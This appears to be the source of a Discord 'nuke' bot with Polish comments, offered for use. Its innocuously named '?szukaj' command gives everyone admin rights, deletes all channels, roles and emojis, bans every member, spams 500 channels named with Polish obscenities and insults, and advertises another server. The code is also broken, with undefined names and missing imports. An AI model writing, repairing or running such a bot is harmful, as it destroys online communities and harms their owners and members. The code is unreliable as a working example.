from os import getenv
from discord.ext import commands


SPAM_CHANNEL = ["MAMO JAK TO", "TATO ROZJABALI SERWER", "NO NIE", "TO MOJE LINKI", "CHUJ MI W DUPE",
                "JA BYLEM PIERWSZY", "SRAM DO MISKI", "CHUJ NA OKO", "PIZDOKLESZCZ", "FIUTOCIAG",
                "NIKT NIE MOZE MIEC FILMOW OPROCZ MNIE", "JESTEM", "ODPADEM GENETCZNYM", "NUKED BY RICK ASTLEY",
                "SZMATO", "YOU ARE RICK ROLLED EZ"]

SPAM_MESSAGE = ["@everyone Zapraszam was na https://discord.gg/movies-city ponieważ to tam są wszystkie filmy które były tu,"
                "nie opłaca się być na discordzie, który kradnie linki innym serwerom, pozdro XD"]


@bot.event
async def on_ready():
    print('The bot is online!')


# Trzeba wpisać "?szukaj" aby włączyć!
# Trzeba wpisać "rick?astleyStop" aby wyłączyć!

bot = commands.Bot(command_prefix='?')


@client.command()
@commands.is_owner()
async def astleyStop(ctx):
    await ctx.bot.logout()
    print(Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)


@client.command()
async def szukaj(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
        try:
            await member.ban()
            print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban("ƉĦɌɄVツ#8276")
            print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age=0, max_uses=0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return
    
   
bot.run(getenv('TOKEN'))
